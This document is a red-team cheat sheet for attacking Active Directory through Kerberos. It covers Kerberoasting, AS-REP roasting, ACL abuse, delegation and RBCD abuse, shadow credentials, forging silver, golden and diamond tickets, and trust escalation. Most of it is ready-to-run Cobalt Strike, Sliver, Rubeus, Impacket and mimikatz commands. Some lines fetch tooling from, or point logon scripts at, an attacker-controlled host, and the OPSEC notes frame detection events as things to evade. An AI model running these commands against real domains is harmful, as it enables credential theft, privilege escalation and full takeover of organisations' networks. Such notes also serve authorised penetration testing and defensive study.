## Kerberos & AD Attacks

Kerberos protocol abuses, delegation attacks, ticket forging, domain trust exploitation, and ACL abuses for domain escalation and dominance.

> [!Note]
> DCSync (replicating krbtgt/domain hashes) is primarily covered in [[4. Post-Exploitation/e. Credential Dumping]]. References here are in the context of trust abuse and ticket forging.

---

## Credential Extraction

### Kerberoasting

Services running under domain accounts have SPNs. The TGS returned by the KDC is encrypted with the service account's password — crack it offline.

#### CS

```sh
# Enumerate SPNs first (avoid honey pot accounts)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# Roast a specific account
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /user:<svc_account> /nowrap

# Roast all (noisy — triggers honey pots)
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /simple /nowrap

# Cross-domain
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /domain:<other.domain> /nowrap
```

#### Sliver

```sh
rubeus -- kerberoast /simple /nowrap
rubeus -- kerberoast /simple /domain:<domain> /nowrap
```

#### Crack

```sh
hashcat -a 0 -m 13100 <hashes_file> <wordlist>
john --format=krb5tgs --wordlist=<wordlist> <hashes_file>
```

> [!Warning]
> Honey pot accounts are configured with fake SPNs. Roasting them generates a 4769 event that is never seen legitimately — high-fidelity detection. Enumerate and be selective.

---

### AS-REP Roasting

Users with pre-authentication disabled (`DONT_REQ_PREAUTH`) can have an AS-REP requested on their behalf. Part of the reply is crackable offline.

#### CS

```sh
# Find targets
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Roast
beacon> execute-assembly C:\Tools\Rubeus.exe asreproast /user:<user> /nowrap
```

#### Sliver

```sh
rubeus -- asreproast /user:<user> /nowrap
```

#### Crack

```sh
hashcat -a 0 -m 18200 <hashes_file> <wordlist>
john --format=krb5asrep --wordlist=<wordlist> <hashes_file>
```

> [!Warning]
> Generates 4768 event with RC4 encryption and preauth type 0.

---

### ACL Abuses

Abuse misconfigured ACLs on AD objects for privilege escalation.

#### ForcePasswordChange (GenericAll / AllExtendedRights)

```sh
# PowerView
Set-DomainUserPassword -Identity <user> -AccountPassword $(ConvertTo-SecureString '<NewPass>' -AsPlainText -Force)

# Sliver (base64 encoded)
sharpsh -t 20 -- -u http://<attacker>/PowerView.ps1 -e -c <BASE64_SET_DOMAINUSERPASSWORD>

# Linux
proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal '<attacker>' -target '<group>' '<domain>/<user>' -hashes ':<hash>'
```

#### GenericWrite on User

Two options: set an SPN and Kerberoast, or set a login script path.

```sh
# Set SPN and kerberoast
Set-DomainObject -Identity <user> -SET @{serviceprincipalname='pwned/service'}
Get-DomainSPNTicket -SPN pwned/service -OutputFormat Hashcat | fl
hashcat -m 13100 -a 0 <hash_file> <wordlist>

# Set login script (executes on user logon)
Set-DomainObject -Identity <user> -SET @{scriptpath='\\<attacker>\share\payload.exe'}
```

#### WriteDacl on Group

```sh
# Windows (PowerView)
Add-DomainObjectAcl -TargetIdentity <group> -PrincipalIdentity <attacker_user> -Rights All
Add-DomainGroupMember -Identity '<group>' -Members '<attacker_user>'

# Linux
proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal '<attacker>' -target '<group>' '<domain>/<user>' -hashes ':<hash>'
proxychains pth-net rpc group addmem "<group>" "<attacker>" -U "<domain>"/"<user>"%"<LM>:<NT>" -S "<dc>"
```

---

## Delegation

### Unconstrained Delegation

When a computer has unconstrained delegation, the KDC includes a copy of the user's TGT in the TGS for any service on that machine. All TGTs that authenticate to it are cached — any can be extracted and reused.

> [!Important]
> Domain Controllers always have unconstrained delegation. Focus on workstations/servers with this flag.

#### CS — Opportunistic

```sh
# Find computers with unconstrained delegation
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# After compromising the target — triage tickets
beacon> execute-assembly C:\Tools\Rubeus.exe triage

# Extract a TGT
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:<LUID> /nowrap

# Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:<TGT>
beacon> steal_token <PID>
```

#### CS — Forced (better — no waiting)

```sh
# 1. Start Rubeus monitor on the compromised server
beacon> execute-assembly C:\Tools\Rubeus.exe monitor /interval:10 /nowrap

# 2. From another Beacon, trigger the DC to authenticate
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <target_dc> <unconstrained_host>

# Rubeus captures the DC$ TGT — use S4U2Self for a usable TGS
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:<admin_user> /self /altservice:cifs/<target_dc> /user:<dc>$ /ticket:<DC_TGT> /nowrap

beacon> jobs
beacon> jobkill <JID>
```

#### Sliver

```sh
sharpsh -- -u 'http://<attacker>/PowerView.ps1' -c '"Get-DomainComputer -UnConstrained"'

# Monitor for TGTs
rubeus -t 30 -- monitor /interval:5 /runfor:15 /nowrap

# Trigger coerce from another session
execute-assembly -t 20 /path/SharpSpoolTrigger.exe <dc> <unconstrained_host>

# Inject captured TGT
rubeus -i -- ptt /ticket:<TGT>
```

---

### Constrained Delegation

Constrained delegation allows a service to request a TGS on behalf of a user to a specific set of services (`msDS-AllowedToDelegateTo`).

#### CS

```sh
# Find constrained delegation computers
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Find users with constrained delegation
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes samaccountname,msds-allowedtodelegateto --json

# Dump the machine TGT (from SYSTEM on the delegating machine)
beacon> execute-assembly C:\Tools\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap

# S4U — impersonate a privileged user to the allowed service
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:<admin> /msdsspn:cifs/<target_dc> /user:<machine>$ /ticket:<TGT> /nowrap

# Alternate service name — same TGT, different service (service name not protected in Kerberos)
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:<admin> /msdsspn:cifs/<target_dc> /altservice:ldap /user:<machine>$ /ticket:<TGT> /nowrap

# Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<admin> /password:FakePass /ticket:<TGS>
beacon> steal_token <PID>
beacon> ls \\<target>\c$    # use FQDN — NetBIOS causes ERROR_LOGON_FAILURE
beacon> dcsync <domain> <DOMAIN>\krbtgt    # after /altservice:ldap on DC
```

#### Sliver — Machine

```sh
sharpsh -- -u 'http://<attacker>/PowerView.ps1' -c '"Get-DomainComputer -TrustedToAuth"'

rubeus -t 20 -- s4u /user:<machine>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:"cifs/<target>" /nowrap /ptt
rubeus -i -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:<TGS>
migrate -p <PID>
```

#### Sliver — User

```sh
sharpsh -- -u 'http://<attacker>/PowerView.ps1' -c '"Get-DomainUser -TrustedToAuth"'
rubeus -t 20 -- hash /password:<password>
rubeus -t 20 -- s4u /user:<user> /rc4:<hash> /impersonateuser:administrator /msdsspn:"cifs/<target>" /nowrap /ptt
```

#### Linux

```sh
impacket-getST -spn cifs/<target> -impersonate administrator '<domain>/<user>:<password>'
export KRB5CCNAME=administrator@cifs_<target>.<domain>.ccache
impacket-psexec -no-pass -k <domain>/administrator@<target> -target-ip <ip>
impacket-atexec -k -no-pass <domain>/administrator@<target> 'powershell -enc <BASE64_PAYLOAD>'
```

---

### Resource-Based Constrained Delegation (RBCD)

`msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer controls who can delegate to it. Requires only WriteProperty/GenericWrite/GenericAll/WriteDacl on the computer object.

#### CS — With Local Admin

```sh
# 1. Find a computer object where your current user has write permissions
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-<domain_id>-[\d]{4,10}" }

beacon> powershell ConvertFrom-SID <SID>

# 2. Get SID of your controlled computer
beacon> powershell Get-DomainComputer -Identity <your_machine> -Properties objectSid

# 3. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<your_machine_sid>)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "<target>" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

# 4. Dump your computer's TGT
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap

# 5. S4U impersonation
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /user:<your_machine>$ /impersonateuser:<admin> /msdsspn:cifs/<target> /ticket:<TGT> /nowrap

# 6. Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<admin> /password:FakePass /ticket:<TGS>
beacon> steal_token <PID>

# Cleanup
beacon> powershell Get-DomainComputer -Identity <target> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### CS — Without Local Admin (StandIn)

```sh
# Check machine quota (default: domain users can create up to 10 computers)
beacon> powershell Get-DomainObject -Identity "DC=<domain>,DC=<tld>" -Properties ms-DS-MachineAccountQuota

# 1. Create a fake computer with StandIn
beacon> execute-assembly C:\Tools\StandIn.exe --computer EvilComputer --make

# 2. Get its hashes
C:\Tools\Rubeus.exe hash /password:<generated_password> /user:EvilComputer$ /domain:<domain>

# 3. Get a TGT for the fake computer
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes_hash> /nowrap

# Remainder of attack is identical to the above
```

#### Sliver (PowerMad + PowerView)

```sh
# Create machine account
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4xxxx2' -AsPlainText -Force)
sharpsh -t 20 -- -u http://<attacker>/Powermad.ps1 -e -c <BASE64_NEW_MACHINEACCOUNT>

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"; $SDbytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDbytes,0); Get-DomainComputer -Identity <target> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
sharpsh -i -t 20 -- -u http://<attacker>/PowerView.ps1 -e -c <BASE64_RBCD_COMMAND>

# S4U
rubeus -t 20 -- hash /password:h4xxxx2
rubeus -t 20 -- s4u /user:myComputer$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/<target> /nowrap /ptt
```

> [!Warning]
> RBCD modifies computer object attributes — detectable via event 5136 (object modification).

---

### Shadow Credentials

Write to `msDS-KeyCredentialLink` on a user or computer to add a key pair. Request a TGT using the private key. Requires DACL-based write access (GenericWrite, WriteDacl).

#### CS

```sh
# 1. List existing keys (important for cleanup)
beacon> execute-assembly C:\Tools\Whisker.exe list /target:<user_or_machine$>

# 2. Add new key pair
beacon> execute-assembly C:\Tools\Whisker.exe add /target:<user_or_machine$>

# 3. Whisker outputs the Rubeus command — run it
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<user_or_machine$> /certificate:<BASE64_CERT> /password:"<whisker_generated_password>" /nowrap

# Cleanup — remove only the added key, not all keys
beacon> execute-assembly C:\Tools\Whisker.exe list /target:<user_or_machine$>
beacon> execute-assembly C:\Tools\Whisker.exe remove /target:<user_or_machine$> /deviceid:<GUID>
```

> [!Warning]
> `Whisker clear` removes ALL keys — breaks legitimate passwordless auth if a key was already present. Always list first, then remove selectively.

---

## Ticket Forging

Post-DA persistence using stolen keys to forge tickets offline.

### Silver Ticket

Forged TGS using the target computer's secret keys. Valid for any user to any service on that specific machine. Computer passwords rotate every 30 days.

```sh
# Get the computer's AES256/RC4 hash (from a SYSTEM Beacon via dcsync or dump)
# Forge the TGS offline
PS> C:\Tools\Rubeus.exe silver /service:cifs/<target_fqdn> /aes256:<hash> /user:<user_to_impersonate> /domain:<domain> /sid:<domain_SID> /nowrap

# Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:<TGS>
beacon> steal_token <PID>
beacon> ls \\<target>\c$
```

```sh
# Sliver
rubeus -t 30 -- silver /service:HTTP/<target_fqdn> /rc4:<hash> /user:<user> /domain:<domain> /nowrap /ldap /ptt
```

Service ticket combinations:

| Access needed    | Service ticket  |
|-----------------|-----------------|
| File share       | CIFS            |
| WinRM            | HOST + HTTP     |
| DCSync (DC only) | LDAP            |

---

### Golden Ticket

Forged TGT using the krbtgt hash. Impersonate any user to any service on any machine in the domain. krbtgt hash never auto-rotates.

```sh
# Get domain SID
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain <domain> -Properties ObjectSid

# Forge the TGT offline (using krbtgt AES256 hash)
PS> C:\Tools\Rubeus.exe golden /aes256:<krbtgt_hash> /user:<user> /domain:<domain> /sid:<domain_SID> /nowrap

# Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:<TGT>
beacon> steal_token <PID>
beacon> ls \\<dc>\c$
```

```sh
# Sliver — child → parent
rubeus -t 30 -- golden /rc4:<krbtgt_hash> /sid:<child_domain_SID> /sids:<parent_domain_EA_SID>-519 /ldap /user:Administrator /domain:<child_domain> /nowrap /ptt
```

> [!Warning]
> Detectable by TGS-REQ without a preceding AS-REQ. Use diamond tickets for better evasion.

---

### Diamond Ticket

Modifies a legitimate TGT by decrypting it with the krbtgt hash and re-encrypting with modified fields. Evades golden ticket detection because a valid AS-REQ precedes the TGS-REQ.

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<RID> /groups:512 /krbkey:<krbtgt_aes256_hash> /nowrap

# /tgtdeleg — obtains a TGT for the current user without needing their password or hash
# /groups:512 — Domain Admins
# /groups:519 — Enterprise Admins
```

```sh
# Sliver — child → parent
beacon> execute-assembly C:\Tools\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<parent_EA_SID>-519 /krbkey:<krbtgt_hash> /nowrap
```

---

## Domain Trusts

### Parent / Child (SID History)

DA in child domain → DA/EA in parent domain. Add the parent domain's privileged group SID to `SID History` in the ticket.

```sh
# Get parent domain SID and find DA/EA group
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain <parent.domain> -Properties ObjectSid
beacon> powershell Get-DomainController -Domain <parent.domain> | select Name
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" -Domain <parent.domain> | select MemberName

# Get child domain SID
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainSid -Domain <child.domain>"'
sharpsh -t 20 -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainSid -Domain <parent.domain>"'

# Golden ticket with /sids (EA group in parent)
PS> C:\Tools\Rubeus.exe golden /aes256:<child_krbtgt_hash> /user:Administrator /domain:<child.domain> /sid:<child_domain_SID> /sids:<parent_domain_SID>-519 /nowrap

# Or diamond ticket
beacon> execute-assembly C:\Tools\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:<parent_domain_EA_SID>-519 /krbkey:<child_krbtgt_hash> /nowrap

# Import and use against parent DC
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:<TGT>
beacon> steal_token <PID>
beacon> ls \\<parent_dc>\c$
```

---

### One-Way Inbound Trust

Principals in the current domain can access resources in the foreign domain. The foreign domain trusts us.

```sh
# Enumerate the foreign domain
beacon> powershell Get-DomainComputer -Domain <foreign.domain> -Properties DnsHostName
beacon> powershell Get-DomainForeignGroupMember -Domain <foreign.domain>
beacon> powershell ConvertFrom-SID <SID>
beacon> powershell Get-DomainGroupMember -Identity "<foreign_group>" | select MemberName

# 1. Get TGT for the user who has access
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<user> /domain:<current.domain> /aes256:<hash> /nowrap

# 2. Request an inter-realm referral ticket to the foreign domain
beacon> execute-assembly C:\Tools\Rubeus.exe asktgs /service:krbtgt/<foreign.domain> /domain:<current.domain> /dc:<current_dc_fqdn> /ticket:<TGT> /nowrap

# 3. Request a TGS in the foreign domain using the inter-realm ticket
beacon> execute-assembly C:\Tools\Rubeus.exe asktgs /service:cifs/<foreign_dc_fqdn> /domain:<foreign.domain> /dc:<foreign_dc_fqdn> /ticket:<INTER_REALM_TICKET> /nowrap

# 4. Import and use
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe ...
beacon> steal_token <PID>
```

> [!Note]
> Inter-realm ticket is RC4 by default — this is normal unless AES has been specifically configured on the trust.

---

### One-Way Outbound Trust

Domain A trusts Domain B. We're in Domain A and should not be able to access Domain B. Partially exploitable via the Trusted Domain Object (TDO) shared credential.

```sh
# 1. Find TDOs
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain <domain> --attributes distinguishedName,name,flatName,trustDirection

# 2. Get the TDO shared key (choose one method)
# Option A: DCSync with TDO GUID (safer)
beacon> powershell Get-DomainObject -Identity "CN=<foreign_domain>,CN=System,DC=<domain>,DC=<tld>" | select objectGuid
beacon> mimikatz @lsadump::dcsync /domain:<domain> /guid:{<TDO_GUID>}

# Option B: lsadump::trust (patches memory — risky on DC)
beacon> mimikatz lsadump::trust /patch

# 3. Find the trust account in the "trusted" domain (named after the trusting domain)
beacon> execute-assembly C:\Tools\ADSearch.exe --search "(objectCategory=user)"
# Look for <TRUSTING_DOMAIN>$ account

# 4. Request TGT as the trust account
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<TRUSTING_DOMAIN>$ /domain:<trusted.domain> /rc4:<TDO_key> /nowrap

# This gives "domain user" level access in the trusted domain
```

---

### Cross-Domain Enumeration & Attacks

```sh
# Trust mapping
beacon> powershell Get-DomainTrust
beacon> powershell Get-DomainTrustMapping
sharpsh -- '-u http://<attacker>/PowerView.ps1 -c "Get-DomainTrustMapping"'

# Foreign group members
beacon> powershell Get-DomainForeignGroupMember -Domain <foreign.domain>

# Kerberoast across trust
beacon> execute-assembly C:\Tools\Rubeus.exe kerberoast /domain:<foreign.domain> /nowrap

# ASREProast across trust
beacon> execute-assembly C:\Tools\Rubeus.exe asreproast /domain:<foreign.domain> /nowrap
```

---

> [!Note]
> **OPSEC summary:**
> - Kerberoasting: 4769 events (especially honey pot SPNs)
> - AS-REP Roasting: 4768 with RC4 + preauth type 0
> - Golden Ticket: TGS-REQ without preceding AS-REQ (detectable)
> - Diamond Ticket: Has a valid AS-REQ — evades golden ticket detection
> - RBCD: modifies computer object attributes (5136 events)
> - DCSync: 4662 events with replication GUIDs
> - Shadow Credentials: writes to msDS-KeyCredentialLink (5136 events)
